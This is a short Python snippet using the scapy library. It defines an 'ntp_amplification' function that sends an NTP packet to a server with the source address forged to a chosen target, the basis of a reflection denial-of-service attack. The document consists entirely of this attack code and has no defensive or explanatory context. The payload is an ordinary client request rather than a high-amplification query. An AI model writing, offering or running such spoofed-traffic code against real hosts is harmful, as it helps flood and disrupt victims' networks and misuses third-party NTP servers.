from scapy.all import *

def ntp_amplification(ntp_address, target_address):
    packet = IP(src=target_address, dst=ntp_address)/UDP(dport=123,sport=50000)/("\x1b\x00\x00\x00"+"\x00"*11*4)
    ans = sr1(packet)
